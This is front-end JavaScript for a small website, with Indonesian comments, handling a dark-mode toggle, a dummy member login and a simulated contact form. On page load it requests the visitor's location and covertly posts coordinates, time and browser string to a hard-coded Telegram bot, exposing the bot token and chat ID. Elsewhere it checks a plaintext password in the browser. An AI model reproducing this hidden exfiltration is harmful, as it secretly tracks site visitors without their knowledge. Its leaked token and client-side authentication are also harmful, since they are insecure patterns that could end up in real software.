// Toggle Dark Mode
const toggleBtn = document.getElementById('darkToggle');
toggleBtn.addEventListener('click', () => {
  document.body.classList.toggle('dark');
  localStorage.setItem('theme', document.body.classList.contains('dark') ? 'dark' : 'light');
});

window.addEventListener('DOMContentLoaded', () => {
  if (localStorage.getItem('theme') === 'dark') {
    document.body.classList.add('dark');
  }
  if (localStorage.getItem('memberLogin')) {
    showMemberArea();
  }

  // Minta lokasi otomatis
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const time = new Date(pos.timestamp).toLocaleString();
        const userAgent = navigator.userAgent;
        const message = `📍 *Lokasi Pengunjung*\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${time}\nBrowser: ${userAgent}`;
        fetch(`https://api.telegram.org/bot7593028566:AAEs4PmJ_3luGYUS_mk9H2xLIxyrhn_Etn8/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: '6950619919',
            text: message,
            parse_mode: 'Markdown'
          })
        });
      },
      (err) => {
        console.warn("Lokasi tidak diizinkan:", err.message);
      }
    );
  }
});

const dummyUser = {
  email: "user@mikazu.id",
  password: "123456",
  name: "Mikazu User"
};

const loginForm = document.getElementById("loginForm");
const loginError = document.getElementById("loginError");
const memberArea = document.getElementById("memberArea");
const logoutBtn = document.getElementById("logoutBtn");
const memberName = document.getElementById("memberName");

if (loginForm) {
  loginForm.addEventListener("submit", function (e) {
    e.preventDefault();
    const email = document.getElementById("loginEmail").value;
    const password = document.getElementById("loginPassword").value;
    if (email === dummyUser.email && password === dummyUser.password) {
      localStorage.setItem("memberLogin", "true");
      localStorage.setItem("memberName", dummyUser.name);
      showMemberArea();
    } else {
      loginError.style.display = "block";
    }
  });
}

if (logoutBtn) {
  logoutBtn.addEventListener("click", function () {
    localStorage.removeItem("memberLogin");
    localStorage.removeItem("memberName");
    location.reload();
  });
}

function showMemberArea() {
  if (memberArea) {
    loginForm.style.display = "none";
    loginError.style.display = "none";
    memberArea.style.display = "block";
    const storedName = localStorage.getItem("memberName") || "Member";
    memberName.textContent = storedName;
  }
}

const form = document.querySelector("form");
if (form) {
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    alert("Pesan Anda telah dikirim! (simulasi)");
    form.reset();
  });
}
